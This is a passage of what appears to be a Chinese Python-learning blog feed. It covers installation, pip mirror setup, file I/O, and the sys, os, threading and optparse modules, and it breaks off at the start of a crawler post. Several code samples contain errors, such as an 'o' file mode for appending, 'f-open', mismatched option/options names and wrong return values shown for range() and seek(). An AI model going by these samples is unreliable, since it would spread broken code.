class="comment">#打印多次可以这么用</span></span><br><span class="line">[<span class="number">123</span>, <span class="number">456</span>, <span class="number">234</span>, <span class="number">256</span>, <span class="number">123</span>, <span class="number">456</span>, <span class="number">234</span>, <span class="number">256</span>, <span class="number">123</span>, <span class="number">456</span>, <span class="number">234</span>, <span class="number">256</span>]</span><br></pre></td></tr></table></figure><p>等于跟拷贝是两个概念，不一样的。等于是指对于这个列表，只是多了一个指向它的标签；而拷贝则是在新的空间复制了一份，占用了额外的内存。两者不同！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python入坑学习笔记(1)</title>
      <link href="/2020/08/23/python%E5%85%A5%E5%9D%91%E4%B9%8B%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/08/23/python%E5%85%A5%E5%9D%91%E4%B9%8B%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="python简介"><a href="#python简介" class="headerlink" title="python简介"></a>python简介</h1><p>python是一门应用比较广泛的编程语言，python语言在编程家族中的地位还是比较高的。<br>Python 对初级程序员而言，是一种伟大的语言，它支持广泛的应用程序开发，从简单的文字处理到 <code>www</code> 浏览器再到游戏。<br>它的优点也有很多：<br>1.易学：Python有相对较少的关键字，结构简单，和一个明确定义的语法，学习起来更加简单。<br>2.易阅读：Python代码定义的更清晰。<br>3.易于维护：Python的成功在于它的源代码是相当容易维护的。<br>4.可嵌入: 你可以将Python嵌入到C/C++程序，让你的程序的用户获得”脚本化”的能力等等。</p><h1 id="python发展史"><a href="#python发展史" class="headerlink" title="python发展史"></a>python发展史</h1><p>Python 是由 Guido van Rossum 在八十年代末和九十年代初，在荷兰国家数学和计算机科学研究所设计出来的。<br>Python 本身也是由诸多其他语言发展而来的,这包括 ABC、Modula-3、C、C++、Algol-68、SmallTalk、Unix shell 和其他的脚本语言等等。像 Perl 语言一样，Python 源代码同样遵循 GPL(GNU General Public License)协议。<br>现在 Python 是由一个核心开发团队在维护，Guido van Rossum 仍然占据着至关重要的作用，指导其进展。<br>Python 2.7 被确定为最后一个 Python 2.x 版本，它除了支持 Python 2.x 语法外，还支持部分 Python 3.1 语法。</p><h1 id="python安装及环境搭配"><a href="#python安装及环境搭配" class="headerlink" title="python安装及环境搭配"></a>python安装及环境搭配</h1><p>进入python官网，传送门——&gt;<a href="https://www.python.org/">python官网</a><br>选择适合您的电脑系统的版本进行下载。<img src="https://img-blog.csdnimg.cn/20200203201314123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>下面以Windows系统为例：<br>打开浏览器访问  <a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a><img src="https://img-blog.csdnimg.cn/20200203201945413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><ul><li>右键点击”此电脑”，然后点击”属性”</li><li>然后点击”高级系统设置”</li><li>选择”系统变量”窗口下面的”Path”,双击即可！</li><li>然后在”Path”行，添加python安装路径即可(我的D:\Python32)，<br><img src="https://img-blog.csdnimg.cn/20200203205948286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></li><li>最后设置成功以后，在cmd命令行，输入命令”python”，就可以有相关显示。<br><img src="https://img-blog.csdnimg.cn/2020020321064944.png" alt="在这里插入图片描述" loading="lazy"></li></ul><p><strong>Python开发工具</strong><br>IDLE - 自带的集成开发工具<br>IDLE是安装Python环境时自带的集成开发工具。但是我们有更好的开发工具。<br>IPython - 更好的交互式编程工具<br>IPython是一种基于Python的交互式解释器。相较于原生的Python交互式环境，IPython提供了更为强大的编辑和交互功能。可以通过Python的包管理工具pip安装IPython</p><h6 id="如何安装IPython"><a href="#如何安装IPython" class="headerlink" title="如何安装IPython"></a>如何安装IPython</h6><p>首先先打开python安装目录，看看有没有pip工具。<br>1.打开目录（在您自己的电脑找您当时安装python的地方），找到Scripts文件夹<br><img src="https://img-blog.csdnimg.cn/20200205150812760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>2.打开Scripts文件夹后，你会看到pip.exe，那么我们把当前目录配置到环境变量里，然后就可以使用pip工具来安装其他第三方库了（IPython为Python的一个第三方库 ）。<img src="https://img-blog.csdnimg.cn/20200205151232931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>3.和配置Python的环境变量差不多，同样是配置到系统变量Path里。<br><img src="https://img-blog.csdnimg.cn/20200205151543384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>4.配置好后建议先升级一下pip<br>Upgrading pip（升级pip命令）<br>我的是Windows10，打开cmd输入命令<code>python -m pip install --upgrade pip</code><br><img src="https://img-blog.csdnimg.cn/20200205151958537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>安装可能会有小差错，不要慌，再试几次，三次不行的话就再找找其他办法，我的是三次输入命令才成功的。<br>5.使用pip安装IPython，命令为<code>pip install ipython</code><br>在这里，我又遇到问题了，<img src="https://img-blog.csdnimg.cn/20200205152627330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>报错是<code>time out</code>因为下载速度太慢，问过学长，才知道这一步是要换源的，python默认是国外的源，我们这里把它换成国内源，下载速度就会很快了。</p><h6 id="python的pip换源"><a href="#python的pip换源" class="headerlink" title="python的pip换源"></a>python的pip换源</h6><p>pip换源：<br>Windows下：<br>在用户目录下建立pip文件夹，进入建立pip.ini写入<br>图中位置：C:\用户\18101<br><img src="https://img-blog.csdnimg.cn/20200205153429861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>新建文件夹命名为pip，在里面建立一个文档，写入<br>清华大学pip（还有其它的国内源：阿里云、中科大等等，可自行百度选择。）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple</span></span><br></pre></td></tr></table></figure><p>文件扩展名写成<code>.ini</code><br>换源成功再次安装ipython<br><img src="https://img-blog.csdnimg.cn/20200205154257728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>不得不说，这速度贼棒！！！！！<br>6.安装好之后检查一下，再次输入<code>pip install ipython</code><br>如果安装成功的话，会提示已安装。<br><img src="https://img-blog.csdnimg.cn/20200205154636152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>到这里，python的环境配置就已经完成了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python脚本编程的知识点</title>
      <link href="/2020/08/23/Python%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2020/08/23/Python%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h1><ol><li>对列表进行迭代<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]:</span><br><span class="line">···<span class="keyword">print</span> (i)</span><br><span class="line">···</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></li><li>通过range()函数生成连续数列<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">···print(i)</span><br><span class="line">···</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure></li><li>range(初始值,终止值,步长)，range得到的是一个左闭右开区间。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;range(<span class="number">1</span>,<span class="number">9</span>,<span class="number">2</span>)</span><br><span class="line">[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>]</span><br></pre></td></tr></table></figure><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1></li><li>文件操作的基本流程</li></ol><ul><li>调用open()函数打开文件，并创建一个File对象</li><li>调用File对象的read()或write()等方法，对文件内容进行读写等操作。</li><li>调用File对象的close()方法，关闭并保存文件内容。</li></ul><ol start="2"><li>open()函数<br>通过open()函数以指定模式打开文件并创建文件对象：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件对象=open(<span class="string">&#x27;文件路径&#x27;</span>, <span class="string">&#x27;模式&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol><ul><li>文件打开模式主要包括：<br>1、r只读模式（默认）<br>2、w只写模式（如果文件已经存在，先清空原有内容，文件不存在则创建文件）<br>3、a追加模式（不覆盖文件中原有的内容）</li><li>如果传递给open()的文件名不存在。写模式和添加模式都会创建一个新的空文件。</li></ul><ol start="3"><li>写入文件</li></ol><ul><li>write()方法不会在字符串的末尾自动添加换行字符</li><li>向文件中写入内容：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=open(<span class="string">&quot;/tmp/ip.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&quot;192.168.80.1\n&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&quot;192.168.80.2\n&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&quot;192.168.80.3\n&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure></li><li>向文件中追加内容：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=open(<span class="string">&quot;/tmp/ip.txt&quot;</span>,<span class="string">&quot;o&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&quot;192.168.80.10\n&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&quot;192.168.80.20\n&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li>读取文件</li></ol><ul><li>Python文件对象提供了三种“读”方法：<br>1、read()<br>read()方法可以一次性读取文件的所有内容<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=open(<span class="string">&quot;/tmp/ip.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br><span class="line"><span class="string">&#x27;192.168.80.1\n192.168.80.2\n192.168.80.3\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure>read()方法也可以指定读取前几个字节的数据：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=open(<span class="string">&quot;/tmp/ip.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read(<span class="number">12</span>)</span><br><span class="line"><span class="string">&#x27;192.168.80.1&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure>2、readline()<br>readline()方法可以从文件中读取一行并作为结果返回：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f-open(<span class="string">&quot;/tmp/ip.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.readline()</span><br><span class="line"><span class="string">&#x27;192.168.80.1\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.readline()</span><br><span class="line"><span class="string">&#x27;192.168.80.2\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure>3、readlines()<br>readlines()方法返回一个列表，文件的每一行作为列表的一个元素：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=open(<span class="string">&quot;/tmp/ip.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.readlines()</span><br><span class="line">[<span class="string">&#x27;192.168.80.1\n&#x27;</span>, <span class="string">&#x27;192.168.80.2\n&#x27;</span>, <span class="string">&#x27;192.168.80.3\n&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.seek(<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.readlines()[<span class="number">0</span>]<span class="comment">#数组限定读取的信息</span></span><br><span class="line"><span class="string">&#x27;192.168.80.1\n&#x27;</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>4、seek()方法可以将指针返回到指定位置。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.seek(<span class="number">0</span>)<span class="comment">#返回到第一行</span></span><br><span class="line"><span class="string">&#x27;192.168.80.1\n&#x27;</span></span><br></pre></td></tr></table></figure></li><li>读取文件</li></ul><ol start="5"><li>通过for循环对列表进行迭代，这是最常用的读取方法。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=open(<span class="string">&quot;/tmp/ip.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line"><span class="keyword">print</span> (i)</span><br></pre></td></tr></table></figure></li><li>通过字符串strip()方法将文件中每行末尾的\n去除<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=open(<span class="string">&quot;/tmp/ip.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line"><span class="keyword">print</span> (i.strip(<span class="string">&quot;\n&quot;</span>))</span><br></pre></td></tr></table></figure><h1 id="导入模块-库"><a href="#导入模块-库" class="headerlink" title="导入模块(库)"></a>导入模块(库)</h1><h2 id="模块的概念"><a href="#模块的概念" class="headerlink" title="模块的概念"></a>模块的概念</h2></li><li>模块也叫库，每个模块中都内置了大量的功能函数、类和变量。它就像是积木，可以根据需要进行调用组合。</li><li>模块就是程序，每个模块就是一个后缀为.py的Python程序。</li><li>Python的模块分为标准模块和第三方模块，标准模块就是python内置的，第三方模块则需要安装之后才能使用。</li><li>可以通过help命令了解一个模块的基本帮助信息，如：<code>help(&#39;sys&#39;)</code><h2 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h2></li><li>无论标准模块还是第三方模块都需要导入。</li><li>导入方法：</li></ol><ul><li>直接调用模块：<code>import 模块名</code></li><li>从模块中调用某个函数：<code>from 模块名 import 函数名</code></li><li><code>import os</code> ，应采用“<code>模块名.方法名</code>”的形式使用模块中的方法。如：<code>os.system()</code></li><li><code>from os import *</code> ，可以直接使用system()方法，无需加上模块名作为前缀。<h1 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h1>sys是一个标准模块，与Python解释器密切相关。</li><li>（1）sys.argv<br>sys.argv是一个变量，专门用来向Python解释器传递参数，类似于Shell脚本编程中的位置变量。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;脚本文件是：&quot;</span>,sys.argv[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">&quot;参数的数量是：&quot;</span>,len(sys.argv))</span><br><span class="line">print(<span class="string">&quot;所有的参数：&quot;</span>,str(sys.argv))</span><br><span class="line">print(<span class="string">&quot;第一个参数是：&quot;</span>,sys.argv[<span class="number">1</span>])</span><br><span class="line">print(<span class="string">&quot;第二个参数是：&quot;</span>,sys.argv[<span class="number">2</span>])</span><br><span class="line">print(<span class="string">&quot;第三个参数是：&quot;</span>,sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure></li><li>（2）sys.exit()<br>sys.exit()是一个方法，作用是退出当前程序。</li></ul><ol><li>sys.exit()退出当前程序，并返回SystemExit异常。</li><li>sys.exit(0)，正常退出。</li><li>sys.exit(“程序退出”)，显示一段提示信息。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">print(<span class="string">&quot;正确使用方法：&quot;</span>+ sys.argv[<span class="number">0</span>] + <span class="string">&quot;IP列表文件&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;例如：./m0re.py /root/ip.txt&quot;</span>)</span><br><span class="line">sys.exit()</span><br></pre></td></tr></table></figure><h1 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h1>os模块提供了访问操作系统服务的功能。<br>它最常用的是<code>os.system()</code>方法，可以在Python中使用操作系统命令。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&quot;ls /root&quot;</span>)</span><br><span class="line">banner.py  flag.sh  <span class="keyword">pass</span>.txt</span><br><span class="line">ip.txt  shadow</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>还有几个</li></ol><ul><li>os.path.isfile()方法，判断指定的对象是否为文件，返回True或False。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.isfile(<span class="string">&quot;/root/pass.txt&quot;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.isfile(<span class="string">&quot;/root/password.txt&quot;</span>)</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li>os.path.isdir()方法，判断指定对象是否为目录。</li><li>os.path.exists()方法，判断指定的对象是否存在。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.exists(<span class="string">&quot;/root/pass.txt&quot;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.exists(<span class="string">&quot;/root/&quot;</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1>通过threading模块中的Thread()类可以创建和管理线程对象。<br>使用时，使用多线程调用一个函数，然后启动，就可以明显提高速度。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t=Thread(target=checkVulns,args=(ip,port))</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure>用时再查<h1 id="optparse模块"><a href="#optparse模块" class="headerlink" title="optparse模块"></a>optparse模块</h1>利用该模块可以设置选项，通过选项向脚本传递所需的参数。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">parser=OptionParser()</span><br><span class="line">parser.add_option(<span class="string">&quot;-f&quot;</span>,<span class="string">&quot;--file&quot;</span>,type=<span class="string">&quot;string&quot;</span>,dest=<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-i&quot;</span>,<span class="string">&quot;--ip&quot;</span>,type=<span class="string">&quot;string&quot;</span>,dest=<span class="string">&quot;address&quot;</span>)</span><br><span class="line">(option,args)=parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> options.filename</span><br><span class="line"><span class="keyword">print</span> options.address</span><br></pre></td></tr></table></figure>代码解释<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">·第一行，导入optparse模块中的类OptionParser。</span><br><span class="line">·第二行，将类实例化成对象。</span><br><span class="line">·第三行，利用add_option()方法添加选项。-f和--file分别表示长短选项名，长选项可以省略。<span class="built_in">type</span>指定了参数类型，默认为string，dest指定将参数赋值给哪个变量。</span><br><span class="line">·第四行，利用add_option()方法添加选项-i和-ip。</span><br><span class="line">·第五行，利用parse_args()方法来获取定义的选项和参数，可以视作一种固定用法。</span><br><span class="line">·parse_args()方法返回两个值，其中options对象保存了所传递进来的参数值。</span><br><span class="line">·第六、七行，通过options.filename和options.address的方式调用参数值。</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python分布式爬虫————爬虫前奏和网络请求</title>
      <link href="/2020/08/23/Python%E5%88%86%E5%B8%83%E7%88%AC%E8%99%AB%E2%80%94%E2%80%94%E7%88%AC%E8%99%AB%E5%89%8D%E5%A5%8F%E5%92%8C%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/"/>
      <url>/2020/08/23/Python%E5%88%86%E5%B8%83%E7%88%AC%E8%99%AB%E2%80%94%E2%80%94%E7%88%AC%E8%99%AB%E5%89%8D%E5%A5%8F%E5%92%8C%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续python的学习，这次学习爬虫，听说比较好玩，我也学学。</p><h1 id="爬虫前奏"><a href="#爬虫前奏" class="headerlink" title="爬虫前奏"></a>爬虫前奏</h1><h2 id="什么是网络爬虫？"><a href="#什么是网络爬虫？" class="headerlink" title="什么是网络爬虫？"></a>什么是网络爬虫？</h2><ol><li>爬虫的实际例子：</li></ol><ul><li>搜索引擎(百度、谷歌、360搜索等)</li><li>数据分析与研究</li><li>抢票软件等</li></ul><ol start="2"><li>什么是网络爬虫</li></ol><ul><li>通俗理解：爬虫是一个模拟人类请求网站行为的程序，可以自动请求网页，并将数据提取下来，然后使用一定的规则提取有价值的数据。</li><li>专业介绍：🍗<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711?fromtitle=%E7%88%AC%E8%99%AB&fromid=22046949&fr=aladdin">百度百科</a>🍖<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E7%88%AC%E8%9F%B2">维基百科</a></li></ul><ol start="3"><li>通用爬虫和聚焦爬虫</li></ol><ul><li>通用爬虫：通用爬虫是搜索引擎提取系统（百度等）的重要组成部分。主要是将互联网上的网页下载到本地，形成一个互联网内容的镜像备份。</li><li>聚焦爬虫：是面向特定需求的一种网络爬虫程序，他与通用爬虫的区别就在于：聚焦爬虫在实践网页抓取的时候会对内容进行筛选和处理，尽量保证只抓取与需求相关的网页信息。</li></ul><ol start="4"><li>大部分语言基本上都可以来写爬虫，但是python有它独特的优点。</li></ol><h1 id="网络请求"><a href="#网络请求" class="headerlink" title="网络请求"></a>网络请求</h1><h2 id="urlopen函数用法"><a href="#urlopen函数用法" class="headerlink" 